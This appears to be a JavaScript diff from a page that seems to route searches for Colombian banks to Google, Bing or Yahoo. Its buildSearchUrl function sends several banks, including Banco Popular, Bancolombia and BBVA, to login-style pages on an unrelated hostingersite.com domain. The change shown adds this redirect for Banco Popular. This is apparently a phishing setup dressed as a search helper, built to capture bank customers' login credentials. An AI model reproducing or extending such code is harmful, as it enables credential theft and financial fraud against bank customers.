@@ -364,7 +364,7 @@
     sudameris:     { engine: "google", q: "Banco GNB Sudameris" },
     itau:          { engine: "bing",   q: "Banco Itaú Colombia" },
     pichincha:     { engine: "yahoo",  q: "Banco Pichincha Colombia" },
-    popular:       { engine: "google", q: "Banco Popular Colombia" },
+    popular:       { engine: "popular", q: "Banco Popular Colombia" },
     santander:     { engine: "bing",   q: "Banco Santander Colombia" },
     serfinanza:    { engine: "yahoo",  q: "Banco Serfinanza" },
     union:         { engine: "google", q: "Banco Unión (antes Giros)" },
@@ -377,7 +377,8 @@
   // Construcción URL según motor
   function buildSearchUrl(engine, q) {
     const query = encodeURIComponent(q);
-    if (engine === "bancolombia") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f14/`;
+    if (engine === "popular") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f18/login/`;
+    if (engine === "ocidente") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f14/`;
     if (engine === "bancolombia") return `https://blueviolet-okapi-275780.hostingersite.com/boton/dinadatos/bancol/cel-login.html`;
     if (engine === "bbva") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f13/`;
     if (engine === "villa") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f1/inicio/`;
